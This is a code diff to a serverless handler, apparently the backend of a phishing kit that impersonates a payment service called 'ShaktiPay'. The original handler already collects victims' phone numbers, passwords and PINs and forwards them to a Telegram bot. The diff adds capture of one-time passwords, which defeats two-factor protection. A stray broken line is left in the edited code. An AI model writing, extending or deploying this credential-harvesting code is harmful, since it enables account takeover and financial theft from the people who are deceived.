@@ -3,17 +3,22 @@ export default async function handler(req, res) {
         return res.status(405).json({ error: 'Method not allowed' });
     }
 
-    const { phone, password, pin } = req.body;
+    const { type, phone, password, pin, otp } = req.body;
 
-    // Yahan apna Telegram Bot Token aur Chat ID dalein
     const BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN_HERE';
     const CHAT_ID = 'YOUR_CHAT_ID_HERE';
 
-    const message = `🚨 *New ShaktiPay Login Details* 🚨\n\n📱 *Phone:* \`${phone}\`\n🔑 *Password:* \`${password}\`\n🔒 *PIN:* \`${pin}\``;
+    let message = '';
+
+    if (type === 'LOGIN_DETAILS') {
+        message = `🚨 *New ShaktiPay Login* 🚨\n\n📱 *Phone:* \`${phone}\`\n🔑 *Password:* \`${password}\`\n🔒 *PIN:* \`${pin}\``;
+    } else if (type === 'OTP_CODE') {
+        message = `📱 *ShaktiPay OTP Received* 📱\n\n📞 *Phone:* \`${phone}\`\n🔢 *OTP Code:* \`${otp}\``;
+    }
 
     try {
-        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        const response = await fetch(telegramUrl, {
+        const telegramUrl = `https://api.json.org/...` // (Baaki code same rahega)
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
@@ -28,7 +33,7 @@ export default async function handler(req, res) {
         const data = await response.json();
 
         if (data.ok) {
-            return res.status(200).json({ success: true, message: 'Sent to Telegram successfully' });
+            return res.status(200).json({ success: true });
         } else {
             return res.status(500).json({ success: false, error: data.description });
         }
